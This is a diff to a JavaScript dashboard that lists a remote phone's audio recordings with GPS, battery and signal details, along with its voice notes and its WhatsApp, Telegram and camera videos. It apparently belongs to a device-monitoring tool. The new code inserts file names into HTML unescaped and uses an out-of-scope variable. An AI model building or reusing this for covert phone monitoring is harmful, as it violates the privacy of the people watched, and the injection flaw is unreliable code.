-      screenOn: val.screenOn !== undefined ? val.screenOn === true : undefined
+      phoneTsMs: parseInt(val.phoneTsMs || val.ts_ms || key || '0'),
+      dashboardTsMs: parseInt(val.dashboardTsMs || key || '0')
     }))
     .filter(s => s.phoneTsMs > 0)
     .sort((a, b) => b.phoneTsMs - a.phoneTsMs);
@@ -1969,662 +1995,186 @@ async function pollHistory() {
 async function pollRecordings() {
   if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  const path = `devices/${selectedDevice}/recordings`;
-
-  // Phase 1: Render from IndexedDB cache instantly
-  let cachedMeta = [];
-  try { cachedMeta = await cacheGetAll('recordingMeta'); } catch (e) {}
-  if (cachedMeta.length) {
-    renderRecordingsFromMeta(cachedMeta);
-  }
-
-  // Phase 2: Shallow fetch to get recording IDs
-  const keys = await fetchRTDB(path, 'shallow=true');
-  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
-    if (!cachedMeta.length) list.innerHTML = '<div class="label">No remote recordings yet</div>';
+  let data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+  if (!data || typeof data !== 'object') {
+    list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
   }
-
-  const recordingIds = Object.keys(keys).sort().reverse(); // newest first
-  if (!cachedMeta.length) list.innerHTML = '<div class="label">Loading recordings...</div>';
-
-  // Phase 3: Compare with cache — only fetch new recordings
-  const cachedIds = new Set(cachedMeta.map(r => r.keyId));
-  const newIds = recordingIds.filter(id => !cachedIds.has(id));
-
-  const recordings = [];
-  for (const id of newIds) {
-    try {
-      const rec = await fetchRTDB(`${path}/${id}`);
-      if (rec && typeof rec === 'object') {
-        recordings.push({ id, ...rec });
-        // Cache metadata (no audio data — lightweight)
-        const metaItem = {
-          keyId: id, id,
-          durationSec: rec.durationSec,
-          sizeBytes: rec.sizeBytes,
-          mimeType: rec.mimeType,
-          createdAt: rec.createdAt,
-          cancelled: rec.cancelled,
-          partsFormat: rec.parts && rec.parts[0] ? rec.parts[0].format : null,
-          partsCount: (rec.parts && rec.parts.length) || 0,
-          partsMetadata: rec.parts && rec.parts[0] ? rec.parts[0].metadata : null
-        };
-        try { await cachePut('recordingMeta', metaItem); } catch (e) {}
-      }
-    } catch (e) {
-      console.warn('Failed to fetch recording', id, e);
-    }
+  const recordings = Object.entries(data).map(([id, rec]) => ({ id, ...rec }));
+  recordings.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+  if (!recordings.length) {
+    list.innerHTML = '<div class="label">No recordings yet</div>';
+    return;
   }
-
-  // Remove deleted recordings from cache
-  const deletedIds = cachedMeta.filter(m => !recordingIds.includes(m.keyId)).map(m => m.keyId);
-  for (const id of deletedIds) {
-    try { await cacheDelete('recordingMeta', id); } catch (e) {}
+  // Deduplicate: keep only first recording per unique (durationSec, sizeBytes) pair
+  const seen = new Set();
+  const uniqueRecordings = recordings.filter(rec => {
+    const key = `${rec.durationSec}_${rec.sizeBytes}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+  if (uniqueRecordings.length !== recordings.length) {
+    console.log(`Deduplicated ${recordings.length} -> ${uniqueRecordings.length} recordings`);
   }
-
-  // Merge: fresh recordings (with parts) + cached recordings (metadata only)
-  const freshIds = new Set(recordings.map(r => r.id));
-  for (const cached of cachedMeta) {
-    if (recordingIds.includes(cached.keyId) && !freshIds.has(cached.keyId)) {
-      recordings.push({ id: cached.keyId, ...cached });
-    }
-  }
-
-  // Sort newest first
-  recordings.sort((a, b) => ((b.createdAt || '') > (a.createdAt || '') ? 1 : -1));
-
-  // Render
-  renderRecordingsFromMeta(recordings);
-}
-
-function renderRecordingsFromMeta(recordings) {
-  const list = document.getElementById('voiceNotesList');
-  if (!list) return;
-
-  // Populate in-memory cache for playback (audio data if available)
-  recordingDataCache = {};
-  for (const rec of recordings) {
-    if (rec.parts && rec.parts.length) {
-      const cacheParts = rec.parts || [];
-      let cacheMime = rec.mimeType || 'audio/mp4';
-      if (cacheParts.length > 0 && cacheParts[0] && cacheParts[0].format) {
-        if (cacheParts[0].format.includes('webm') || cacheParts[0].format.includes('opus')) cacheMime = 'audio/webm';
-        else if (cacheParts[0].format.includes('mp4') || cacheParts[0].format.includes('aac')) cacheMime = 'audio/mp4';
-        else if (cacheParts[0].format.includes('3gpp') || cacheParts[0].format.includes('amr')) cacheMime = 'audio/3gpp';
-      }
-      recordingDataCache[rec.id] = { parts: cacheParts, mimeType: cacheMime };
-    }
-  }
-
-  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${recordings.length} recording${recordings.length>1?'s':''} • newest first</div>`;
-
-  for (const rec of recordings) {
-    const id = rec.id || rec.keyId;
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${uniqueRecordings.length} recording${uniqueRecordings.length>1?'s':''} • newest first</div>`;
+  for (const rec of uniqueRecordings) {
     const dur = rec.durationSec ? Math.floor(rec.durationSec/60) + ':' + String(rec.durationSec%60).padStart(2,'0') : '';
     const size = rec.sizeBytes ? (rec.sizeBytes/1024/1024).toFixed(1) + ' MB' : '';
     const created = rec.createdAt ? pkt(rec.createdAt) : '';
     const parts = rec.parts || [];
-    const hasParts = parts.length > 0 || rec.partsCount > 0;
-
+    
+    // Merge all base64 segments into single blob for seamless playback
+    let mergedUrl = '';
     let formatLabel = '';
-    if (rec.partsFormat) {
-      formatLabel = ` • ${rec.partsFormat}`;
-    } else if (parts.length > 0 && parts[0] && parts[0].format) {
-      formatLabel = ` • ${parts[0].format}`;
+    if (parts.length > 0) {
+      // Determine format from first part
+      const firstPart = parts[0];
+      if (firstPart && firstPart.format) {
+        formatLabel = ` • ${firstPart.format}`;
+      } else if (rec.mimeType) {
+        formatLabel = ` • ${rec.mimeType}`;
+      }
+      
+      // Merge all base64 segments
+      try {
+        let totalLen = 0;
+        const chunks = [];
+        for (const part of parts) {
+          if (part && part.data) {
+            const binary = atob(part.data);
+            const bytes = new Uint8Array(binary.length);
+            for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
+            chunks.push(bytes);
+            totalLen += bytes.length;
+          }
+        }
+        const merged = new Uint8Array(totalLen);
+        let offset = 0;
+        for (const c of chunks) { merged.set(c, offset); offset += c.length; }
+        
+        // Determine MIME type from format or mimeType
+        let mimeType = rec.mimeType || 'audio/mp4';
+        if (parts[0] && parts[0].format) {
+          if (parts[0].format.includes('webm') || parts[0].format.includes('opus')) mimeType = 'audio/webm';
+          else if (parts[0].format.includes('mp4') || parts[0].format.includes('aac')) mimeType = 'audio/mp4';
+          else if (parts[0].format.includes('3gpp') || parts[0].format.includes('amr')) mimeType = 'audio/3gpp';
+        }
+        const blob = new Blob([merged], { type: mimeType });
+        mergedUrl = URL.createObjectURL(blob);
+      } catch (e) {
+        console.error('Failed to merge audio segments:', e);
+      }
     }
-
+    
     let metaHtml = '';
     if (rec.cancelled) metaHtml += '<span class="chip" style="background:var(--warning);color:#000;font-size:9px">Cancelled</span> ';
     if (formatLabel) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${formatLabel}</span> `;
-
-    const partsCount = rec.partsCount || parts.length;
-    if (partsCount > 1) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${partsCount} segments</span> `;
-
-    const metadata = (parts[0] && parts[0].metadata) || rec.partsMetadata;
-    if (metadata) {
-      if (metadata.batteryLevel !== undefined) metaHtml += `<span class="chip" style="font-size:9px">🔋 ${metadata.batteryLevel}%</span> `;
-      if (metadata.networkType) metaHtml += `<span class="chip" style="font-size:9px">${metadata.networkType}</span> `;
-      if (metadata.signalStrengthDbm !== undefined) metaHtml += `<span class="chip" style="font-size:9px">📶 ${metadata.signalStrengthDbm}dBm</span> `;
-      if (metadata.gpsLatitude && metadata.gpsLongitude) metaHtml += `<span class="chip" style="font-size:9px">📍 ${metadata.gpsLatitude.toFixed(4)},${metadata.gpsLongitude.toFixed(4)}</span> `;
+    if (rec.parts && rec.parts.length > 1) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${rec.parts.length} segments merged</span> `;
+    
+    // Add metadata from first segment if available
+    if (rec.parts && rec.parts[0] && rec.parts[0].metadata) {
+      const m = rec.parts[0].metadata;
+      if (m.batteryLevel !== undefined) metaHtml += `<span class="chip" style="font-size:9px">🔋 ${m.batteryLevel}%</span> `;
+      if (m.networkType) metaHtml += `<span class="chip" style="font-size:9px">${m.networkType}</span> `;
+      if (m.signalStrengthDbm !== undefined) metaHtml += `<span class="chip" style="font-size:9px">📶 ${m.signalStrengthDbm}dBm</span> `;
+      if (m.gpsLatitude && m.gpsLongitude) metaHtml += `<span class="chip" style="font-size:9px">📍 ${m.gpsLatitude.toFixed(4)},${m.gpsLongitude.toFixed(4)}</span> `;
     }
-
-    const playerId = `player_${id}`;
-
-    html += `<div class="voice-card">
-      <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
-        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${id}')">Delete</button>
-        ${hasParts
-          ? `<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:9px;padding:2px 6px;margin-left:4px" onclick="loadAndPlayRecording('${id}')">▶ Play</button>`
-          : ''
-        }
-      </div>
-      <audio id="${playerId}" controls preload="none" style="width:100%;margin-top:6px;display:none"></audio>
-    </div>`;
+    
+    let downloadLinks = '';
+    if (mergedUrl) {
+      // Single merged audio player
+      const playerHtml = `<audio controls preload="none" src="${mergedUrl}" type="${mimeType || 'audio/mp4'}" style="width:100%;margin-top:6px"></audio>`;
+      
+      // Download link for merged file
+      downloadLinks = `<a href="${mergedUrl}" download="recording_${rec.id}.m4a" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
+      
+      html += `<div class="voice-card">
+        <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
+          <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button></div>
+        ${playerHtml}
+        ${downloadLinks ? `<div style="font-size:10px;margin-top:4px">${downloadLinks}</div>` : ''}
+      </div>`;
+    } else {
+      // Fallback for legacy format
+      html += `<div class="voice-card">
+        <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} 
+          <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button></div>
+        <div style="font-size:10px;color:var(--muted)">No playable segments</div>
+      </div>`;
+    }
   }
   list.innerHTML = html;
 }
-
-// Lazy load and play a specific recording
-async function loadAndPlayRecording(recordingId) {
-  const audioEl = document.getElementById(`player_${recordingId}`);
-  const btn = audioEl.previousElementSibling?.querySelector('button[onclick*="loadAndPlayRecording"]') || audioEl.previousElementSibling;
-  
-  if (audioEl.src) {
-    // Already loaded, just toggle play/pause
-    if (audioEl.paused) audioEl.play(); else audioEl.pause();
-    return;
-  }
-  
-  // Look up recording data from cache (avoids stuffing huge audio data into button HTML)
-  let cached = recordingDataCache[recordingId];
-  
-  // Fallback: fetch from RTDB if not in memory cache (e.g. rendered from IndexedDB before poll)
-  if (!cached) {
-    btn.textContent = '⏳ Loading...';
-    btn.disabled = true;
-    try {
-      const rec = await fetchRTDB(`devices/${selectedDevice}/recordings/${recordingId}`);
-      if (rec && rec.parts && rec.parts.length) {
-        const cacheParts = rec.parts || [];
-        let cacheMime = rec.mimeType || 'audio/mp4';
-        if (cacheParts[0] && cacheParts[0].format) {
-          if (cacheParts[0].format.includes('webm') || cacheParts[0].format.includes('opus')) cacheMime = 'audio/webm';
-          else if (cacheParts[0].format.includes('mp4') || cacheParts[0].format.includes('aac')) cacheMime = 'audio/mp4';
-          else if (cacheParts[0].format.includes('3gpp') || cacheParts[0].format.includes('amr')) cacheMime = 'audio/3gpp';
-        }
-        recordingDataCache[recordingId] = { parts: cacheParts, mimeType: cacheMime };
-        cached = recordingDataCache[recordingId];
-      } else {
-        showAlert('Recording has no audio data', 'error');
-        btn.textContent = '▶ Play';
-        btn.disabled = false;
-        return;
-      }
-    } catch (e) {
-      showAlert('Failed to load recording: ' + e.message, 'error');
-      btn.textContent = '▶ Play';
-      btn.disabled = false;
-      return;
-    }
-  }
-  const parts = cached.parts;
-  const mimeType = cached.mimeType;
-  
-  btn.textContent = '⏳ Loading...';
-  btn.disabled = true;
-  audioEl.style.display = 'block';
-  
-  try {
-    // Merge all base64 segments
-    let totalLen = 0;
-    const chunks = [];
-    for (const part of parts) {
-      if (part && part.data) {
-        const binary = atob(part.data);
-        const bytes = new Uint8Array(binary.length);
-        for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
-        chunks.push(bytes);
-        totalLen += bytes.length;
-      }
-    }
-    const merged = new Uint8Array(totalLen);
-    let offset = 0;
-    for (const c of chunks) { merged.set(c, offset); offset += c.length; }
-    
-    const blob = new Blob([merged], { type: mimeType });
-    audioEl.src = URL.createObjectURL(blob);
-    await audioEl.play();
-    btn.textContent = '⏸ Pause';
-    btn.onclick = () => audioEl.pause();
-    btn.disabled = false;
-    
-    audioEl.onpause = () => {
-      btn.textContent = '▶ Play';
-      btn.onclick = () => loadAndPlayRecording(recordingId);
-    };
-    audioEl.onplay = () => {
-      btn.textContent = '⏸ Pause';
-    };
-  } catch (e) {
-    console.error('Failed to load recording:', e);
-    btn.textContent = '❌ Error';
-    btn.disabled = false;
-    showAlert('Failed to load audio: ' + e.message, 'error');
-  }
-}
-
-// --- Voice Notes Subtab ---
-
-function switchVoiceSubtab(subtab) {
-  document.querySelectorAll('#tab-voice .subtab-btn').forEach(b => b.classList.remove('active'));
-  document.querySelectorAll('#tab-voice .voice-subtab').forEach(d => d.style.display = 'none');
-  document.querySelector(`#tab-voice .subtab-btn[data-subtab="${subtab}"]`).classList.add('active');
-  document.getElementById(`voice-sub-${subtab.replace('voice-', '')}`).style.display = '';
-  if (subtab === 'voice-notes') pollVoiceNotes();
-}
-
 async function pollVoiceNotes() {
   if (!selectedDevice) return;
-  const list = document.getElementById('voiceNotesSubList');
-  const path = `devices/${selectedDevice}/voice_notes`;
-
-  // Phase 1: Render from IndexedDB cache instantly
-  let cachedNotes = [];
-  let cachedBatches = [];
-  try {
-    cachedNotes = await cacheGetAll('voiceNoteMeta');
-    cachedBatches = await cacheGetAll('voiceNoteBatches');
-  } catch (e) {}
-  if (cachedNotes.length) {
-    renderVoiceNotesFromMeta(cachedNotes);
-  }
-
-  // Phase 2: Shallow fetch to get batch keys
-  const keys = await fetchRTDB(path, 'shallow=true');
-  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
-    if (!cachedNotes.length) list.innerHTML = '<div class="label">No voice notes yet</div>';
-    try { await cacheClear('voiceNoteMeta'); } catch (e) {}
-    try { await cacheClear('voiceNoteBatches'); } catch (e) {}
+  const list = document.getElementById('voiceNotesList');
+  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  if (!data || typeof data !== 'object') {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
     return;
   }
-
-  const batchKeys = Object.keys(keys).sort().reverse();
-  if (!cachedNotes.length) list.innerHTML = '<div class="label">Loading voice notes...</div>';
-
-  // Phase 3: Only fetch new batches
-  const cachedBatchKeys = new Set(cachedBatches.map(b => b.keyId));
-  const newBatchKeys = batchKeys.filter(k => !cachedBatchKeys.has(k));
-
-  const allNotes = [];
-  for (const batchKey of newBatchKeys) {
-    try {
-      const batch = await fetchRTDB(`${path}/${batchKey}`);
-      if (batch && batch.notes && Array.isArray(batch.notes)) {
-        // Cache batch metadata
-        try { await cachePut('voiceNoteBatches', { keyId: batchKey, batchKey, ts_ms: batch.ts_ms, totalCount: batch.notes.length }); } catch (e) {}
-        for (let i = 0; i < batch.notes.length; i++) {
-          const note = batch.notes[i];
-          allNotes.push({ batchKey, noteIndex: i, ...note });
-          // Cache note metadata (no audioData)
-          const metaItem = {
-            keyId: `${batchKey}_${i}`,
-            batchKey, noteIndex: i,
-            fileName: note.fileName,
-            dateAdded: note.dateAdded,
-            durationMs: note.durationMs,
-            sizeBytes: note.sizeBytes,
-            mimeType: note.mimeType,
-            hasAudio: !!note.audioData
-          };
-          try { await cachePut('voiceNoteMeta', metaItem); } catch (e) {}
+  // voice_notes: object with batch keys -> { notes: [...], totalCount, ts_ms, freeMb }
+  let allNotes = [];
+  for (const [batchKey, batch] of Object.entries(data)) {
+    if (batch && batch.notes && Array.isArray(batch.notes)) {
+      for (const note of batch.notes) {
+        if (note && note.audioData) {
+          allNotes.push({ ...note, batchKey });
         }
       }
-    } catch (e) {
-      console.warn('Failed to fetch voice note batch', batchKey, e);
     }
   }
-
-  // Add cached notes that still exist
-  for (const cached of cachedNotes) {
-    const batchKey = cached.batchKey;
-    if (batchKeys.includes(batchKey)) {
-      allNotes.push({ ...cached, audioData: undefined });
-    }
-  }
-
-  // Remove deleted batches from cache
-  for (const cached of cachedBatches) {
-    if (!batchKeys.includes(cached.keyId)) {
-      try { await cacheDelete('voiceNoteBatches', cached.keyId); } catch (e) {}
-    }
-  }
-  // Remove deleted notes from cache
-  const existingNoteKeys = new Set(allNotes.map(n => `${n.batchKey}_${n.noteIndex}`));
-  for (const cached of cachedNotes) {
-    if (!existingNoteKeys.has(cached.keyId)) {
-      try { await cacheDelete('voiceNoteMeta', cached.keyId); } catch (e) {}
-    }
-  }
-
+  // Sort by dateAdded (newest first)
+  allNotes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
   if (!allNotes.length) {
     list.innerHTML = '<div class="label">No voice notes yet</div>';
     return;
   }
-
-  // Sort by dateAdded newest first
-  allNotes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
-
-  renderVoiceNotesFromMeta(allNotes);
-}
-
-function renderVoiceNotesFromMeta(allNotes) {
-  const list = document.getElementById('voiceNotesSubList');
-  if (!list) return;
-
   let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${allNotes.length} voice note${allNotes.length>1?'s':''} • newest first</div>`;
-
   for (const note of allNotes) {
-    const fileName = note.fileName || 'Unknown';
-    const dur = note.durationMs ? Math.floor(note.durationMs/60000) + ':' + String(Math.floor(note.durationMs%60000/1000)).padStart(2,'0') : '';
-    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + ' KB' : '';
-    const dateAdded = note.dateAdded ? pkt(note.dateAdded * 1000) : '';
-    const batchKey = note.batchKey;
-    const noteIndex = note.noteIndex;
-    const playerId = `vn_player_${batchKey}_${noteIndex}`;
-
-    // hasAudio from live data, or from cached metadata
-    const hasAudio = !!(note.audioData) || note.hasAudio;
-
+    const dur = note.durationMs ? Math.floor(note.durationMs/60000) + ':' + String(Math.floor((note.durationMs%60000)/1000)).padStart(2,'0') : '';
+    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(1) + ' KB' : '';
+    const created = note.dateAdded ? pkt(note.dateAdded) : '';
+    const mimeType = note.mimeType || 'audio/ogg';
+    
+    let audioUrl = '';
+    if (note.audioData) {
+      try {
+        const binary = atob(note.audioData);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+        const blob = new Blob([bytes], { type: mimeType });
+        audioUrl = URL.createObjectURL(blob);
+      } catch (e) {
+        console.error('Failed to decode voice note audio:', e);
+      }
+    }
+    
+    let metaHtml = '';
+    if (note.fileName) metaHtml += `<span class="chip" style="font-size:9px">${note.fileName}</span> `;
+    
+    let downloadLink = '';
+    if (audioUrl) {
+      downloadLink = `<a href="${audioUrl}" download="${note.fileName || 'voice_note.ogg'}" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
+    }
+    
+    let playerHtml = '';
+    if (audioUrl) {
+      playerHtml = `<audio controls preload="none" src="${audioUrl}" type="${mimeType}" style="width:100%;margin-top:6px"></audio>`;
+    } else {
+      playerHtml = '<div style="font-size:10px;color:var(--muted)">No playable audio data</div>';
+    }
+    
     html += `<div class="voice-card">
-      <div class="vname">${fileName} ${dateAdded ? `• ${dateAdded}` : ''} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''}
-        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNoteFromList('${batchKey}', ${noteIndex})">Delete</button>
-        ${hasAudio
-          ? `<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:9px;padding:2px 6px;margin-left:4px" onclick="loadAndPlayVoiceNote('${batchKey}', ${noteIndex})">▶ Play</button>`
-          : `<span class="chip" style="background:var(--border);color:var(--muted);border-color:var(--border);font-size:9px;padding:2px 6px;margin-left:4px;cursor:default">No audio</span>`
-        }
-      </div>
-      ${hasAudio ? `<audio id="${playerId}" controls preload="none" style="width:100%;margin-top:6px;display:none"></audio>` : ''}
+      <div class="vname">${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${note.batchKey}', ${allNotes.indexOf(note)})">Delete</button></div>
+      ${playerHtml}
+      ${downloadLink ? `<div style="font-size:10px;margin-top:4px">${downloadLink}</div>` : ''}
     </div>`;
   }
   list.innerHTML = html;
 }
-
-// Cache voice note data for playback (avoids inline base64 in buttons)
-let voiceNoteDataCache = {};
-
-async function loadAndPlayVoiceNote(batchKey, noteIndex) {
-  const audioEl = document.getElementById(`vn_player_${batchKey}_${noteIndex}`);
-  if (!audioEl) { showAlert('Voice note player not found', 'error'); return; }
-  const btn = audioEl.previousElementSibling?.querySelector('button[onclick*="loadAndPlayVoiceNote"]') || audioEl.previousElementSibling;
-  
-  if (audioEl.src) {
-    if (audioEl.paused) audioEl.play(); else audioEl.pause();
-    return;
-  }
-  
-  const cacheKey = `${batchKey}_${noteIndex}`;
-  let note = voiceNoteDataCache[cacheKey];
-  if (!note) {
-    try {
-      const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
-      if (!batch || !batch.notes || !batch.notes[noteIndex]) {
-        showAlert('Voice note not found', 'error');
-        return;
-      }
-      voiceNoteDataCache = {};
-      voiceNoteDataCache[cacheKey] = batch.notes[noteIndex];
-      note = batch.notes[noteIndex];
-    } catch (e) {
-      showAlert('Failed to load voice note', 'error');
-      return;
-    }
-  }
-  
-  const audioData = note.audioData;
-  const mimeType = note.mimeType || 'audio/mp4';
-  if (!audioData) {
-    showAlert('No audio data in this note', 'error');
-    return;
-  }
-  
-  btn.textContent = '⏳ Loading...';
-  btn.disabled = true;
-  audioEl.style.display = 'block';
-  
-  try {
-    const binary = atob(audioData);
-    const bytes = new Uint8Array(binary.length);
-    for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
-    
-    const blob = new Blob([bytes], { type: mimeType });
-    audioEl.src = URL.createObjectURL(blob);
-    await audioEl.play();
-    btn.textContent = '⏸ Pause';
-    btn.onclick = () => audioEl.pause();
-    btn.disabled = false;
-    
-    audioEl.onpause = () => {
-      btn.textContent = '▶ Play';
-      btn.onclick = () => loadAndPlayVoiceNote(batchKey, noteIndex);
-    };
-    audioEl.onplay = () => {
-      btn.textContent = '⏸ Pause';
-    };
-  } catch (e) {
-    console.error('Failed to load voice note:', e);
-    btn.textContent = '❌ Error';
-    btn.disabled = false;
-    showAlert('Failed to play voice note: ' + e.message, 'error');
-  }
-}
-
-async function deleteVoiceNoteFromList(batchKey, noteIndex) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
-  try {
-    const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
-    if (!batch || !batch.notes || !batch.notes[noteIndex]) {
-      showAlert('Voice note not found', 'error');
-      return;
-    }
-    const note = batch.notes[noteIndex];
-    batch.notes.splice(noteIndex, 1);
-    batch.totalCount = batch.notes.length;
-    if (batch.notes.length === 0) {
-      await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
-    } else {
-      await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
-        method: 'PUT',
-        body: JSON.stringify(batch)
-      });
-    }
-    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
-    pollVoiceNotes();
-    await refreshStorage();
-  } catch (e) {
-    showAlert('Delete failed: ' + e.message, 'error');
-  }
-}
-
-// --- Videos ---
-async function pollVideos() {
-  if (!selectedDevice) return;
-  const grid = document.getElementById('videoGrid');
-  const path = `devices/${selectedDevice}/videos`;
-  
-  const keys = await fetchRTDB(path, 'shallow=true');
-  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
-    grid.innerHTML = '<div class="label">No videos yet</div>';
-    document.getElementById('videoCount').textContent = '';
-    return;
-  }
-  
-  const videoIds = Object.keys(keys).filter(k => /^\d+$/.test(k)).sort((a, b) => parseInt(b) - parseInt(a));
-  grid.innerHTML = '<div class="label">Loading videos...</div>';
-  
-  const allVideos = [];
-  for (const videoId of videoIds) {
-    try {
-      const video = await fetchRTDB(`${path}/${videoId}`);
-      if (video) {
-        allVideos.push(video);
-      }
-    } catch (e) {
-      console.warn('Failed to fetch video', videoId, e);
-    }
-  }
-  
-  if (!allVideos.length) {
-    grid.innerHTML = '<div class="label">No videos yet</div>';
-    document.getElementById('videoCount').textContent = '';
-    return;
-  }
-  
-  if (allVideos.length > 0 && !window._videoDebugged) {
-    const first = allVideos[0];
-    console.log('=== VIDEO DEBUG ===');
-    console.log('Total videos:', allVideos.length);
-    console.log('First video raw:', JSON.stringify(first));
-    const keys = Object.keys(first).filter(k => k !== 'data' && k !== 'thumb');
-    const vals = keys.map(k => k + '=' + JSON.stringify(first[k])).join(' | ');
-    showAlert('First video: ' + vals, 'warn');
-    window._videoDebugged = true;
-  }
-  
-  allVideos.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
-  
-  document.getElementById('videoCount').textContent = `(${allVideos.length})`;
-  
-  let html = '';
-  for (const v of allVideos) {
-    const fileName = (v.fileName && v.fileName !== 'null' && !v.fileName.startsWith('undefined')) ? v.fileName : 'Unknown';
-    const duration = v.durationMs ? formatDuration(v.durationMs) : '';
-    const size = v.sizeBytes ? (v.sizeBytes/1024/1024).toFixed(1) + ' MB' : '';
-    const dateAdded = v.dateAdded ? pkt(v.dateAdded) : '';
-    const mimeType = v.mimeType || 'video/mp4';
-    const videoId = v.videoId || '';
-    const width = v.width || 0;
-    const height = v.height || 0;
-    const res = width && height ? `${width}x${height}` : '';
-    const data = v.data || '';
-    const thumb = v.thumb || '';
-    
-    const safeFileName = fileName || 'Unknown';
-    let source = 'other';
-    if (safeFileName.toLowerCase().includes('whatsapp')) source = 'whatsapp';
-    else if (safeFileName.toLowerCase().includes('camera') || safeFileName.toLowerCase().includes('dcim') || safeFileName.toLowerCase().startsWith('vid_')) source = 'camera';
-    else if (safeFileName.toLowerCase().includes('telegram')) source = 'telegram';
-    
-    html += `<div class="pwrap" onclick="openVideoLightbox(this)" data-source="${source || 'other'}" data-video-id="${videoId}" data-base64="${data}" data-mime="${mimeType || 'video/mp4'}" data-filename="${(fileName || 'Unknown').replace(/"/g,'&quot;')}" style="aspect-ratio:16/9;cursor:pointer">
-      ${thumb ? `<img src="data:image/jpeg;base64,${thumb}" loading="lazy" alt="${fileName}" style="width:100%;height:100%;object-fit:cover">` : 
-        `<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--muted);font-size:28px">&#x1F3AC;</div>`}
-      <div class="pcap">
-        <div>${fileName}</div>
-        <div class="ptime">${dateAdded ? `• ${dateAdded}` : ''} ${duration ? `• ${duration}` : ''} ${size ? `• ${size}` : ''} ${res ? `• ${res}` : ''}</div>
-      </div>
-      <div style="position:absolute;top:4px;right:4px;display:flex;gap:2px">
-        <button class="chip" style="background:rgba(0,0,0,.7);color:#fff;border:none;padding:2px 6px;font-size:9px;border-radius:4px" onclick="event.stopPropagation();openVideoLightbox(this)">▶</button>
-        <button class="chip" style="background:rgba(248,81,73,.9);color:#000;border:none;padding:2px 6px;font-size:9px;border-radius:4px" onclick="event.stopPropagation();deleteVideo('${videoId}')">🗑</button>
-      </div>
-    </div>`;
-  }
-  grid.innerHTML = html;
-  
-  document.querySelectorAll('#videoFilterChips .chip').forEach(chip => {
-    chip.onclick = () => {
-      document.querySelectorAll('#videoFilterChips .chip').forEach(c => c.classList.remove('active'));
-      chip.classList.add('active');
-      filterVideos(chip.dataset.filter);
-    };
-  });
-  
-  document.getElementById('videoSearch').oninput = (e) => filterVideos(document.querySelector('#videoFilterChips .chip.active')?.dataset.filter || 'all', e.target.value);
-}
-
-function formatDuration(ms) {
-  const s = Math.floor(ms / 1000);
-  const m = Math.floor(s / 60);
-  const h = Math.floor(m / 60);
-  if (h > 0) return `${h}:${String(m % 60).padStart(2,'0')}:${String(s % 60).padStart(2,'0')}`;
-  return `${m}:${String(s % 60).padStart(2,'0')}`;
-}
-
-function filterVideos(source, search = '') {
-  const grid = document.getElementById('videoGrid');
-  const cards = grid.querySelectorAll('.pwrap');
-  const term = search.toLowerCase();
-  cards.forEach(card => {
-    const matchSource = source === 'all' || card.dataset.source === source;
-    const matchSearch = !term || card.querySelector('.pcap').textContent.toLowerCase().includes(term);
-    card.style.display = (matchSource && matchSearch) ? '' : 'none';
-  });
